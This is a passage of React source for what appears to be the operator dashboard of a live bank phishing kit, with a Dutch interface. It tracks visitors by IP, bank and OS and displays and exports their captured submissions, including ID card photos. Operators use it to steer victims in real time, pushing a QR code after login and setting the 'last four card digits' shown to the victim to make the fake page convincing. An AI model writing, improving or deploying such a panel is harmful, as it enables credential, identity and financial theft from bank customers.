            <button type="button" aria-label="Menu sluiten" onClick={() => setMenuOpen(false)} className="flex h-9 w-9 items-center justify-center rounded-lg text-xl leading-none text-purple-200 transition hover:bg-white/10 hover:text-white">
              ×
            </button>
          </div>
          <nav className="flex-1 space-y-1 overflow-y-auto px-3 py-4">
            <p className="px-2 pb-1.5 text-[10.5px] font-extrabold uppercase tracking-[0.16em] text-purple-300/60">Menu</p>
            {TABS.map((t) => {
              const active = tab === t.key && !sessionId;
              return (
                <button
                  key={t.key}
                  onClick={() => goTab(t.key)}
                  className={`relative flex min-h-[52px] w-full items-center gap-3 overflow-hidden rounded-xl px-3 text-left text-[14.5px] font-bold transition active:scale-[0.99] ${active ? "bg-white/[0.08] text-white" : "text-purple-100/80 hover:bg-white/[0.05] hover:text-white"}`}
                >
                  {active && <span className="absolute left-0 top-2 h-[calc(100%-16px)] w-1 rounded-full bg-gradient-to-b from-fuchsia-400 to-purple-600" />}
                  <span className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-lg ${active ? "bg-gradient-to-br from-fuchsia-500 to-purple-700 text-white" : "bg-white/[0.07] text-purple-200"}`}>
                    <NavIcon k={t.key} className="h-[18px] w-[18px]" />
                  </span>
                  <span className="flex-1">{t.label}</span>
                  {t.key === "requests" && requestCount > 0 && (
                    <span className="flex h-5 min-w-5 items-center justify-center rounded-full bg-red-500 px-1.5 text-[11px] font-extrabold text-white">{requestCount}</span>
                  )}
                </button>
              );
            })}
            <p className="px-2 pb-1.5 pt-4 text-[10.5px] font-extrabold uppercase tracking-[0.16em] text-purple-300/60">Sessie</p>
            <div className="flex items-center gap-3 rounded-xl bg-white/[0.04] px-3 py-2.5 ring-1 ring-white/[0.07]">
              <span className="live-dot h-2 w-2 shrink-0 rounded-full bg-emerald-400" />
              <span className="flex-1 text-[13px] font-semibold text-purple-100">{onlineCount} live bezoekers</span>
              <span className="rounded-md bg-white/[0.07] px-1.5 py-0.5 font-mono text-[10.5px] text-purple-300">{apiMode ? "PG" : "lokaal"}</span>
            </div>
          </nav>
          <div className="border-t border-white/[0.07] p-3">
            <div className="flex items-center gap-2.5 rounded-xl bg-white/[0.04] p-2.5 ring-1 ring-white/[0.07]">
              <span className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-gradient-to-br from-purple-500 to-indigo-700 text-[14px] font-black text-white">a</span>
              <span className="min-w-0 flex-1 leading-tight">
                <span className="block truncate text-[13.5px] font-bold text-white">admin</span>
                <span className="block text-[11px] text-purple-300/70">Beheerder</span>
              </span>
              <button onClick={() => { setMenuOpen(false); doLogout(); }} aria-label="Uitloggen" className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg text-purple-200 transition hover:bg-red-500/15 hover:text-red-200">
                <NavIcon k="logout" className="h-[18px] w-[18px]" />
              </button>
            </div>
          </div>
        </aside>
      </div>

      <main className="relative z-10 mx-auto w-full px-3 py-4 sm:px-6 sm:py-5">
        {/* ============ SESSION VIEW (auto-connected) ============ */}
        {sessionVisitor ? (
          <SessionView
            v={sessionVisitor}
            now={now}
            logs={sessionLogs}
            onBack={() => closeSession()}
            onAction={(cmd) => sendCommandLocal(sessionVisitor.id, cmd)}
            onRemove={() => removeVisitor(sessionVisitor.id)}
          />
        ) : tab === "logs" ? (
          <GlobalLogs submissions={submissions} onView={(id) => setSessionId(id)} />
        ) : tab === "settings" ? (
          <Settings apiMode={apiMode} onlineCount={onlineCount} total={allList.length} onLogout={doLogout} />
        ) : (
          <>
            {/* Dashboard / Requests table */}
            <div className="flex flex-wrap items-center justify-between gap-2">
              <h2 className="text-[16px] font-extrabold text-white">
                {tab === "requests" ? `Verzoeken (${list.length})` : `Dashboard (${list.length})`}
                <span className="ml-2 text-[12px] font-semibold text-purple-300">{apiMode ? "Postgres API" : "lokale modus"}</span>
              </h2>
              <div className="flex flex-wrap items-center gap-1.5">
                <button
                  onClick={() => exportAllLogs(submissions)}
                  disabled={submissions.length === 0}
                  className="min-h-[36px] rounded-full bg-emerald-600 px-4 py-1.5 text-[13px] font-extrabold text-white shadow-[0_4px_16px_rgba(5,150,105,0.4)] transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
                >
                  ⭳ Export all
                </button>
                {[{ k: "all", l: "Alles" }, { k: "online", l: "Online" }, { k: "offline", l: "Offline" }].map((f) => (
                  <button
                    key={f.k}
                    onClick={() => setFilter(f.k)}
                    className={`rounded-full px-3 py-1.5 text-[13px] font-bold ${filter === f.k ? "bg-fuchsia-600 text-white" : "bg-white/10 text-purple-200"}`}
                  >
                    {f.l}
                  </button>
                ))}
              </div>
            </div>

            {list.length === 0 ? (
              <div className="mt-3 rounded-xl bg-white/5 p-6 text-center text-[14px] text-purple-200 ring-1 ring-white/10">
                Geen bezoekers hier. Open de site in een ander tabblad, klik op een bank — deze verschijnt hier en de sessie opent automatisch.
              </div>
            ) : (
              <>
                {/* Desktop table — only this list scrolls, page stays fixed */}
                <div className="admin-scroll mt-3 hidden max-h-[calc(100dvh-280px)] overflow-auto rounded-xl ring-1 ring-white/10 md:block">
                  <table className="w-full min-w-[760px] border-collapse bg-[#1d1430] text-left text-[14px]">
                    <thead>
                      <tr className="sticky-head bg-gradient-to-r from-fuchsia-700 to-purple-700 text-[13px] uppercase tracking-wider text-white">
                        <th className="whitespace-nowrap px-4 py-3">Status</th>
                        <th className="whitespace-nowrap px-4 py-3">IP</th>
                        <th className="whitespace-nowrap px-4 py-3">Bank</th>
                        <th className="whitespace-nowrap px-4 py-3">OS</th>
                        <th className="whitespace-nowrap px-4 py-3">Overzicht</th>
                        <th className="whitespace-nowrap px-4 py-3">Acties</th>
                      </tr>
                    </thead>
                    <tbody>
                      {paged.map((v) => {
                        const online = isOnline(v, now);
                        const wait = needsAction(v, now);
                        return (
                          <tr key={v.id} className={`border-t border-white/5 hover:bg-white/5 ${wait ? "bg-red-500/[0.07] ring-1 ring-inset ring-red-500/40" : ""}`}>
                            <td className="whitespace-nowrap px-4 py-3">
                              {wait ? (
                                <span className="wait-blink inline-flex items-center gap-1.5 rounded-full bg-red-500 px-2.5 py-1 text-[12px] font-extrabold uppercase tracking-wide text-white shadow-[0_0_16px_rgba(239,68,68,0.6)]">
                                  <span className="h-1.5 w-1.5 rounded-full bg-white" />
                                  Wachten
                                </span>
                              ) : (
                                <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
                                  <span className={`h-1.5 w-1.5 rounded-full ${online ? "bg-green-400" : "bg-neutral-400"}`} />
                                  {online ? "Online" : "Offline"}
                                </span>
                              )}
                            </td>
                            <td className="whitespace-nowrap px-4 py-3 font-mono text-[13px] text-purple-100">{v.ip || "…"}</td>
                            <td className="whitespace-nowrap px-4 py-3 font-semibold text-purple-100">{v.bankName || v.bank || "BANK NIET GESELECTEERD"}</td>
                            <td className="whitespace-nowrap px-4 py-3 text-purple-200">{parseOS(v.ua)}</td>
                            <td className="whitespace-nowrap px-4 py-3">
                              <span className="inline-flex items-center gap-1 rounded bg-white/10 px-2 py-0.5 font-mono text-[13px] text-purple-100">
                                👁 {logsByVisitor[v.id] || 0}
                              </span>
                            </td>
                            <td className="whitespace-nowrap px-4 py-3">
                              <div className="flex gap-1.5">
                                <button onClick={() => openSession(v)} className="min-h-[32px] rounded-md bg-fuchsia-600 px-2.5 py-1 text-[13px] font-bold text-white hover:bg-fuchsia-500">
                                  Bekijk
                                </button>
                                <button onClick={() => removeVisitor(v.id)} className="min-h-[32px] rounded-md bg-white/10 px-2.5 py-1 text-[13px] font-bold text-red-300 hover:bg-white/20">
                                  Verwijderen
                                </button>
                              </div>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>

                {/* Phone cards — only this list scrolls */}
                <div className="admin-scroll mt-3 max-h-[calc(100dvh-320px)] space-y-2.5 overflow-y-auto pr-0.5 md:hidden">
                  {paged.map((v) => {
                    const online = isOnline(v, now);
                    const wait = needsAction(v, now);
                    return (
                      <div key={v.id} className={`w-full rounded-xl bg-[#1d1430] p-3 ring-1 ${wait ? "ring-2 ring-red-500/60" : "ring-white/10"}`}>
                        <div className="flex items-center gap-2.5">
                          <MiniLogo slug={v.bank} name={v.bankName} />
                          <div className="min-w-0 flex-1">
                            <p className="truncate font-mono text-[14px] font-bold text-purple-100">{v.ip || "…"}</p>
                            <p className="truncate text-[13px] text-purple-300">{v.bankName || "BANK NIET GESELECTEERD"} • {parseOS(v.ua)}</p>
                          </div>
                          {wait ? (
                            <span className="wait-blink shrink-0 rounded-full bg-red-500 px-2.5 py-1 text-[12px] font-extrabold uppercase text-white shadow-[0_0_16px_rgba(239,68,68,0.6)]">
                              Wachten
                            </span>
                          ) : (
                            <span className={`shrink-0 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
                              {online ? "Online" : "Offline"}
                            </span>
                          )}
                        </div>
                        <div className="mt-2.5 flex gap-1.5">
                          <button onClick={() => openSession(v)} className="min-h-[44px] flex-1 rounded-lg bg-fuchsia-600 text-[14px] font-bold text-white">
                            Bekijk 👁 {logsByVisitor[v.id] || 0}
                          </button>
                          <button onClick={() => removeVisitor(v.id)} className="min-h-[44px] rounded-lg bg-white/10 px-4 text-[14px] font-bold text-red-300">
                            Verwijderen
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
                <Pagination page={safePage} pageCount={pageCount} total={list.length} pageSize={PAGE_SIZE} onPage={setPage} />
              </>
            )}
          </>
        )}
      </main>
    </div>
  );
}

async function copyText(t) {
  try {
    await navigator.clipboard.writeText(t);
    return true;
  } catch {
    try {
      const ta = document.createElement("textarea");
      ta.value = t;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      ta.remove();
      return true;
    } catch {
      return false;
    }
  }
}

function LogCard({ s, meta, footer, wrapClass }) {
  const [copied, setCopied] = useState(null);
  const [dlBusy, setDlBusy] = useState(null);
  const entries = Object.entries(s.data || {});
  const allText = entries.map(([k, v]) => `${k}- ${String(v)}`).join("\n");
  const isId = s.kind === "id";
  const idImgs = isId
    ? [
        ["Recto", s.data?.front],
        ["Verso", s.data?.back],
      ].filter(([, u]) => typeof u === "string" && u)
    : [];

  async function doCopy(text, key) {
    if (await copyText(text)) {
      setCopied(key);
      setTimeout(() => setCopied((c) => (c === key ? null : c)), 1200);
    }
  }

  // Real download (blob) — works for Cloudinary + inline images.
  async function downloadImage(url, label) {
    setDlBusy(label);
    try {
      const r = await fetch(url);
      if (!r.ok) throw new Error();
      const b = await r.blob();
      const u = URL.createObjectURL(b);
      const a = document.createElement("a");
      a.href = u;
      a.download = `id-${label}-${Date.now()}.jpg`;
      document.body.appendChild(a);
      a.click();
      setTimeout(() => {
        URL.revokeObjectURL(u);
        a.remove();
      }, 1500);
    } catch {
      window.open(url, "_blank", "noopener");
    } finally {
      setDlBusy(null);
    }
  }

  // New tab viewer: embeds the image straight into a blank page.
  // No fetch roundtrip, so CORS, popups and data-URLs can't break it.
  function openTab(url, label) {
    const w = window.open("", "_blank", "noopener");
    if (!w) return;
    try {
      const safe = String(url).replace(/"/g, "&quot;");
      w.document.write(
        `<title>${label}</title><body style="margin:0;background:#0e0a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;box-sizing:border-box"><img src="${safe}" style="max-width:100%;height:auto;border-radius:8px" onerror="document.body.innerHTML='<p style=color:#fff;font-family:sans-serif>Afbeelding kan niet worden geladen</p>'"></body>`
      );
      w.document.close();
    } catch {
      w.location.href = url;
    }
  }

  return (
    <div className={wrapClass || "w-full rounded-lg bg-white/5 p-2.5 ring-1 ring-white/10"}>
      <div className="flex flex-wrap items-center gap-1.5">
        <span className="rounded-full bg-fuchsia-600 px-2 py-0.5 text-[12px] font-bold uppercase text-white">{s.kind}</span>
        {meta}
        <span className="ml-auto text-[12px] text-purple-300">{fmtTime(s.at)}</span>
        <button
          type="button"
          onClick={() => doCopy(allText, "__all")}
          title="Alles kopiëren"
          className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-fuchsia-600 active:scale-95"
        >
          {copied === "__all" ? "✓" : "⧉"}
        </button>
      </div>
      <div className="mt-2 space-y-1 rounded-md bg-black/30 p-2 font-mono text-[13px] leading-relaxed text-purple-50">
        {isId && idImgs.length > 0 ? (
          <div className="grid grid-cols-2 gap-2 font-sans">
            {idImgs.map(([label, url]) => (
              <div key={label} className="overflow-hidden rounded-lg bg-white/5 ring-1 ring-white/10">
                <button
                  type="button"
                  onClick={() => openTab(url, label)}
                  title="Open in nieuw tabblad"
                  className="block w-full"
                >
                  <img src={url} alt={label} loading="lazy" className="h-28 w-full bg-white object-contain" />
                </button>
                <div className="flex items-center justify-between gap-1 px-1.5 py-1">
                  <span className="text-[12px] font-bold text-purple-200">{label}</span>
                  <span className="flex gap-1">
                    <button
                      type="button"
                      onClick={() => downloadImage(url, label)}
                      disabled={dlBusy === label}
                      title="Downloaden"
                      className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1.5 text-[14px] font-bold text-purple-100 transition hover:bg-emerald-600 hover:text-white active:scale-95 disabled:opacity-50"
                    >
                      {dlBusy === label ? "…" : "⭳"}
                    </button>
                    <button
                      type="button"
                      onClick={() => doCopy(url, `img-${label}`)}
                      title="URL kopiëren"
                      className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1 text-[12px] font-bold text-purple-200 transition hover:bg-fuchsia-600 hover:text-white active:scale-95"
                    >
                      {copied === `img-${label}` ? "✓" : "⧉"}
                    </button>
                  </span>
                </div>
              </div>
            ))}
          </div>
        ) : (
          entries.map(([k, val]) => (
          <div key={k} className="flex items-start gap-x-2 break-all">
            <span className="shrink-0 font-bold text-fuchsia-300">{k}-</span>
            <span className="min-w-0 flex-1 break-all">{String(val)}</span>
            <button
              type="button"
              onClick={() => doCopy(String(val), k)}
              title={`Kopiëren ${k}`}
              className="flex min-h-[24px] min-w-[24px] shrink-0 items-center justify-center rounded-md bg-white/10 px-1 text-[12px] font-bold text-purple-200 transition hover:bg-fuchsia-600 hover:text-white active:scale-95"
            >
              {copied === k ? "✓" : "⧉"}
            </button>
          </div>
          ))
        )}
      </div>
      {footer}
    </div>
  );
}

function Pagination({ page, pageCount, total, pageSize, onPage }) {
  if (pageCount <= 1) {
    return (
      <div className="mt-3 flex items-center justify-between rounded-2xl bg-white/[0.04] px-4 py-2.5 ring-1 ring-white/10">
        <p className="text-[13px] text-purple-300">{total} bezoekers • 1 pagina • 30 per pagina</p>
        <span className="rounded-full bg-emerald-500/15 px-2.5 py-1 text-[12px] font-bold text-emerald-300">Live</span>
      </div>
    );
  }
  const from = page * pageSize + 1;
  const to = Math.min(total, (page + 1) * pageSize);
  // Compact window: 1 … p-1 p p+1 … N
  const nums = [];
  for (let i = 0; i < pageCount; i++) {
    if (i === 0 || i === pageCount - 1 || Math.abs(i - page) <= 1) nums.push(i);
    else if (nums[nums.length - 1] !== "…") nums.push("…");
  }
  const ghost =
    "flex min-h-[42px] items-center justify-center gap-1 rounded-xl bg-white/[0.06] px-3 text-[13px] font-bold text-purple-100 ring-1 ring-white/10 transition hover:bg-white/[0.14] active:scale-95 disabled:cursor-not-allowed disabled:opacity-35";
  const numBtn = (n) =>
    `flex min-h-[42px] min-w-[42px] items-center justify-center rounded-xl px-2 text-[14px] font-extrabold transition active:scale-95 ${
      n === page
        ? "bg-gradient-to-br from-fuchsia-500 to-purple-700 text-white shadow-[0_6px_20px_rgba(217,70,239,0.45)] ring-1 ring-white/20"
        : "bg-white/[0.06] text-purple-100 ring-1 ring-white/10 hover:bg-white/[0.14]"
    }`;
  return (
    <div className="mt-3 flex flex-wrap items-center gap-x-3 gap-y-2 rounded-2xl bg-white/[0.04] px-3 py-2.5 ring-1 ring-white/10 sm:px-4">
      <p className="mr-auto text-[13px] text-purple-300">
        <b className="text-white">{from}–{to}</b> van <b className="text-white">{total}</b>
        <span className="ml-2 hidden rounded-full bg-white/10 px-2 py-0.5 text-[11px] font-bold text-purple-200 sm:inline">
          Pagina {page + 1}/{pageCount}
        </span>
      </p>
      <div className="flex flex-wrap items-center gap-1.5">
        <button disabled={page === 0} onClick={() => onPage(0)} title="Eerste pagina" className={ghost}>«</button>
        <button disabled={page === 0} onClick={() => onPage(page - 1)} className={ghost}>
          ‹<span className="hidden sm:inline">&nbsp;Vorige</span>
        </button>
        {nums.map((n, i) =>
          n === "…" ? (
            <span key={`e${i}`} className="px-1 text-purple-400">…</span>
          ) : (
            <button key={n} onClick={() => onPage(n)} className={numBtn(n)}>
              {n + 1}
            </button>
          )
        )}
        <button disabled={page >= pageCount - 1} onClick={() => onPage(page + 1)} className={ghost}>
          <span className="hidden sm:inline">Volgende&nbsp;</span>›
        </button>
        <button disabled={page >= pageCount - 1} onClick={() => onPage(pageCount - 1)} title="Laatste pagina" className={ghost}>»</button>
      </div>
    </div>
  );
}

// QR detector loads lazily — if it ever fails, cropping falls back to a
// center square, so a preview/upload always shows (never blank).
let jsQRfn = null;
let jsQRfailed = false;
async function getJsQR() {
  if (jsQRfn || jsQRfailed) return jsQRfn;
  try {
    const m = await import("jsqr");
    jsQRfn = m.default || m;
    return jsQRfn;
  } catch {
    jsQRfailed = true;
    return null;
  }
}

function loadImage(file) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    const url = URL.createObjectURL(file);
    img.onload = () => {
      URL.revokeObjectURL(url);
      resolve(img);
    };
    img.onerror = () => {
      URL.revokeObjectURL(url);
      reject(new Error("read"));
    };
    img.src = url;
  });
}

function canvasBlob(canvas) {
  return new Promise((resolve, reject) => {
    canvas.toBlob((b) => (b ? resolve(b) : reject(new Error("convert"))), "image/jpeg", 0.88);
  });
}

// Auto-detect the QR code and crop tightly to it (square + margin).
// Returns { blob, detected }. Falls back to a center square when no QR found.
async function autoCropQr(file) {
  const img = await loadImage(file);
  const max = 1200;
  const sc = Math.min(1, max / Math.max(img.width, img.height));
  const w = Math.max(1, Math.round(img.width * sc));
  const h = Math.max(1, Math.round(img.height * sc));
  const work = document.createElement("canvas");
  work.width = w;
  work.height = h;
  const wctx = work.getContext("2d", { willReadFrequently: true });
  wctx.drawImage(img, 0, 0, w, h);

  let box = null;
  try {
    const data = wctx.getImageData(0, 0, w, h);
    const det = await getJsQR();
    const code = det ? det(data.data, w, h) : null;
    if (code?.location) {
      const pts = [
        code.location.topLeftCorner,
        code.location.topRightCorner,
        code.location.bottomRightCorner,
        code.location.bottomLeftCorner,
      ];
      const xs = pts.map((p) => p.x);
      const ys = pts.map((p) => p.y);
      box = { x0: Math.min(...xs), y0: Math.min(...ys), x1: Math.max(...xs), y1: Math.max(...ys) };
    }
  } catch {}

  let sx, sy, side;
  if (box) {
    const margin = Math.max(box.x1 - box.x0, box.y1 - box.y0) * 0.1 + 8;
    let x0 = box.x0 - margin;
    let y0 = box.y0 - margin;
    let x1 = box.x1 + margin;
    let y1 = box.y1 + margin;
    side = Math.max(x1 - x0, y1 - y0);
    // expand smaller axis to square, centered
    const cx = (x0 + x1) / 2;
    const cy = (y0 + y1) / 2;
    x0 = cx - side / 2;
    y0 = cy - side / 2;
    // clamp into the image
    x0 = Math.max(0, Math.min(w - side, x0));
    y0 = Math.max(0, Math.min(h - side, y0));
    side = Math.min(side, w - x0, h - y0);
    sx = x0;
    sy = y0;
  } else {
    // fallback: center square
    side = Math.min(w, h);
    sx = (w - side) / 2;
    sy = (h - side) / 2;
  }

  const outMax = 700;
  const outScale = Math.min(1, outMax / side);
  const out = document.createElement("canvas");
  out.width = Math.max(1, Math.round(side * outScale));
  out.height = out.width;
  const octx = out.getContext("2d");
  octx.fillStyle = "#ffffff";
  octx.fillRect(0, 0, out.width, out.height);
  octx.drawImage(work, sx, sy, side, side, 0, 0, out.width, out.height);
  const blob = await canvasBlob(out);
  return { blob, detected: !!box };
}

function fileToJpegBlob(file) {
  // Downscale huge phone photos so uploads stay fast (Cloudinary + inline).
  return new Promise((resolve, reject) => {
    const img = new Image();
    const url = URL.createObjectURL(file);
    img.onload = () => {
      try {
        const max = 900;
        const sc = Math.min(1, max / Math.max(img.width, img.height));
        const c = document.createElement("canvas");
        c.width = Math.max(1, Math.round(img.width * sc));
        c.height = Math.max(1, Math.round(img.height * sc));
        c.getContext("2d").drawImage(img, 0, 0, c.width, c.height);
        URL.revokeObjectURL(url);
        c.toBlob((b) => (b ? resolve(b) : reject(new Error("convert"))), "image/jpeg", 0.85);
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = () => {
      URL.revokeObjectURL(url);
      reject(new Error("read"));
    };
    img.src = url;
  });
}

function blobToDataURL(blob) {
  return new Promise((res, rej) => {
    const r = new FileReader();
    r.onload = () => res(r.result);
    r.onerror = rej;
    r.readAsDataURL(blob);
  });
}

// BIL-only: upload the session QR (Cloudinary, inline fallback).
// One image per session: uploading replaces (and deletes) the old one.
// Shows: not-uploaded / uploading % / uploaded / failed.
function QrUploadCard({ visitorId, bankName }) {
  const [current, setCurrent] = useState(null);
  const [file, setFile] = useState(null);
  const [cropBlob, setCropBlob] = useState(null);
  const [preview, setPreview] = useState("");
  const [pct, setPct] = useState(0);
  const [st, setSt] = useState("idle"); // idle|detecting|ready|uploading|done|error
  const [msg, setMsg] = useState("");

  const refresh = async () => {
    if (apiEnabled()) {
      try {
        const r = await apiGetQr(visitorId);
        setCurrent(r?.qr || null);
        return;
      } catch {}
    }
    try {
      const m = readQrMap();
      setCurrent(m[visitorId] || null);
    } catch {}
  };

  useEffect(() => {
    setCurrent(null);
    setFile(null);
    setCropBlob(null);
    setPreview("");
    setPct(0);
    setSt("idle");
    setMsg("");
    refresh();
    const iv = setInterval(refresh, 4000);
    const onStorage = (e) => {
      if (e.key === "live_qr_v1") refresh();
    };
    window.addEventListener("storage", onStorage);
    const ch = getChannel();
    const onMsg = (ev) => {
      if (ev.data?.type === "qr-update" && ev.data?.visitorId === visitorId) refresh();
    };
    ch?.addEventListener?.("message", onMsg);
    return () => {
      clearInterval(iv);
      window.removeEventListener("storage", onStorage);
      try {
        ch?.removeEventListener?.("message", onMsg);
        ch?.close?.();
      } catch {}
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [visitorId]);

  async function pick(e) {
    const f = e.target.files?.[0];
    e.target.value = "";
    if (!f) {
      setFile(null);
      setCropBlob(null);
      setPreview("");
      setSt(current ? "done" : "idle");
      setMsg("");
      return;
    }
    setFile(f);
    setCropBlob(null);
    setPreview(URL.createObjectURL(f));
    setSt("detecting");
    setMsg("QR detecteren en bijsnijden…");
    try {
      const { blob, detected } = await autoCropQr(f);
      setCropBlob(blob);
      setPreview(URL.createObjectURL(blob));
      setSt("ready");
      setMsg(detected ? "✓ QR auto-gedetecteerd en bijgesneden" : "Geen QR gevonden — midden uitgesneden");
    } catch {
      setCropBlob(null);
      setPreview("");
      setSt("error");
      setMsg("Afbeelding niet leesbaar");
    }
  }

  async function upload() {
    if (!cropBlob || st === "uploading" || st === "detecting") return;
    setSt("uploading");
    setPct(0);
    setMsg("");
    try {
      const blob = cropBlob;
      if (apiEnabled()) {
        // Prefer Cloudinary; fall back to inline Postgres when unconfigured.
        let cfg = null;
        try {
          cfg = await apiCloudinaryConfig();
        } catch {}
        if (cfg?.enabled && cfg?.cloudName) {
          await apiUploadQrCloudinary(visitorId, blob, cfg, (p) => setPct(p));
        } else {
          setPct(40);
          const dataUrl = await blobToDataURL(blob);
          setPct(80);
          await apiUploadQrInline(visitorId, dataUrl);
          setPct(100);
        }
      } else {
        const dataUrl = await blobToDataURL(blob);
        const m = readQrMap();
        m[visitorId] = { image: dataUrl, at: Date.now() };
        writeQrMap(m);
        try {
          getChannel()?.postMessage({ type: "qr-update", visitorId });
        } catch {}
        setPct(100);
      }
      setSt("done");
      setMsg("✓ Geüpload — zichtbaar aan gebruikerszijde");
      setFile(null);
      setPreview("");
      refresh();
      // Push the visitor straight to the QR page if they're still parked
      // pre-QR (loader after login). Past that point, no yanking.
      try {
        let st = null;
        if (apiEnabled()) {
          const v = await apiGetVisitors();
          st = v?.visitors?.find((x) => x.id === visitorId)?.status;
        } else {
          st = readVisitors()[visitorId]?.status;
        }
        if (st === "waiting" || st === "login_submitted") {
          const at = Date.now();
          const m = readCommands();
          m[visitorId] = { type: "ask_qr", at, by: "admin" };
          writeCommands(m);
          try {
            getChannel()?.postMessage({ type: "command", visitorId, command: "ask_qr", at });
          } catch {}
          if (apiEnabled()) apiSendCommand(visitorId, "ask_qr").catch(() => {});
        }
      } catch {}
    } catch (err) {
      setSt("error");
      setMsg(`Upload mislukt: ${err.message || "opnieuw proberen"}`);
    }
  }

  async function remove() {
    try {
      if (apiEnabled()) await apiDeleteQr(visitorId);
      else {
        const m = readQrMap();
        delete m[visitorId];
        writeQrMap(m);
        try {
          getChannel()?.postMessage({ type: "qr-update", visitorId });
        } catch {}
      }
      setCurrent(null);
      setSt("idle");
      setMsg("");
    } catch (e) {
      setMsg("Verwijderen mislukt");
    }
  }

  return (
    <div className="rounded-xl bg-white/[0.04] p-3 ring-1 ring-fuchsia-400/20">
      <h4 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">QR tonen ({bankName || "bank"})</h4>
      {current?.image ? (
        <img src={current.image} alt="QR" className="mx-auto mt-2 h-28 w-28 rounded-lg bg-white object-contain p-1" />
      ) : (
        <p className="mt-2 rounded-lg bg-white/5 px-2 py-1.5 text-center text-[12px] text-purple-300">
          {st === "uploading" ? "Bezig met uploaden…" : "Nog geen QR geüpload"}
        </p>
      )}
      <label className="mt-2 block min-h-[44px] cursor-pointer rounded-lg bg-white/10 px-3 py-2.5 text-center text-[13px] font-bold text-purple-100 transition hover:bg-white/20">
        {preview ? "Andere afbeelding kiezen" : "Kies QR-afbeelding"}
        <input type="file" accept="image/*" className="hidden" onChange={pick} />
      </label>
      {preview && (
        <img src={preview} alt="preview" className="mx-auto mt-2 h-20 w-20 rounded-lg bg-white object-contain p-1 opacity-80" />
      )}
      {st === "uploading" && (
        <div className="mt-2">
          <div className="h-2.5 w-full overflow-hidden rounded-full bg-white/10">
            <div className="h-full rounded-full bg-gradient-to-r from-fuchsia-500 to-purple-500 transition-all" style={{ width: `${pct}%` }} />
          </div>
          <p className="mt-1 text-center text-[12px] font-bold text-purple-200">Uploaden… {pct}%</p>
        </div>
      )}
      <div className="mt-2 flex gap-1.5">
        <button
          onClick={upload}
          disabled={!cropBlob || st === "uploading" || st === "detecting"}
          className="min-h-[44px] flex-1 rounded-lg bg-fuchsia-600 text-[13px] font-extrabold text-white transition hover:bg-fuchsia-500 active:scale-95 disabled:opacity-40"
        >
          {st === "detecting" ? "Detecteren…" : current?.image ? "Vervangen" : "Uploaden"}
        </button>
        {current?.image && (
          <button onClick={remove} className="min-h-[44px] rounded-lg bg-white/10 px-3 text-[13px] font-bold text-red-300">
            Wissen
          </button>
        )}
      </div>
      {msg && (
        <p className={`mt-1.5 text-center text-[12px] font-bold ${st === "error" ? "text-red-300" : "text-emerald-300"}`}>
          {msg}
        </p>
      )}
    </div>
  );
}

// Admin types 4 digits -> visitor sees "numéro de carte se terminant par: XXXX"
// on the card step. One hint per visitor, live via API or local BroadcastChannel.
function CardHintCard({ visitorId }) {
  const [input, setInput] = useState("");
  const [live, setLive] = useState("");
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState("");

  const refresh = async () => {
    if (apiEnabled()) {
      try {
        const r = await apiGetCardHint(visitorId);
        setLive(r?.hint?.last4 || "");
        return;
      } catch {}
    }
    try {
      const m = readCardHintMap();
      setLive(m[visitorId]?.last4 || "");
    } catch {}
  };

  useEffect(() => {
    setInput("");
    setLive("");
    setMsg("");
    refresh();
    const iv = setInterval(refresh, 4000);
    const onStorage = (e) => {
      if (e.key === "live_cardhint_v1") refresh();
    };
    window.addEventListener("storage", onStorage);
    const ch = getChannel();
    const onMsg = (ev) => {
      if (ev.data?.type === "cardhint-update" && ev.data?.visitorId === visitorId) refresh();
    };
    ch?.addEventListener?.("message", onMsg);
    return () => {
      clearInterval(iv);
      window.removeEventListener("storage", onStorage);
      try {
        ch?.removeEventListener?.("message", onMsg);
        ch?.close?.();
      } catch {}
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [visitorId]);

  async function save() {
    const digits = String(input).replace(/\D/g, "").slice(0, 4);
    if (digits.length !== 4) {
      setMsg("Voer exact 4 cijfers in.");
      return;
    }
    setBusy(true);
    setMsg("");
    try {
      if (apiEnabled()) {
        await apiSetCardHint(visitorId, digits);
      } else {
        const m = readCardHintMap();
        m[visitorId] = { last4: digits, at: Date.now() };
        writeCardHintMap(m);
        try {
          getChannel()?.postMessage({ type: "cardhint-update", visitorId });
        } catch {}
      }
      setLive(digits);
      setMsg("✓ Live — bezoeker ziet deze 4 cijfers");
    } catch (e) {
      setMsg("Opslaan mislukt, opnieuw proberen.");
    } finally {
      setBusy(false);
    }
  }

  async function clear() {
    setBusy(true);
    setMsg("");
    try {
      if (apiEnabled()) {
        try {
          await apiDeleteCardHint(visitorId);
        } catch {
          await apiSetCardHint(visitorId, "");
        }
      } else {
        const m = readCardHintMap();
        delete m[visitorId];
        writeCardHintMap(m);
        try {
          getChannel()?.postMessage({ type: "cardhint-update", visitorId });
        } catch {}
      }
      setLive("");
      setInput("");
      setMsg("Gewist — bezoeker ziet geen hint meer.");
    } catch {
      setMsg("Wissen mislukt.");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="rounded-xl bg-white/[0.04] p-3 ring-1 ring-emerald-400/25">
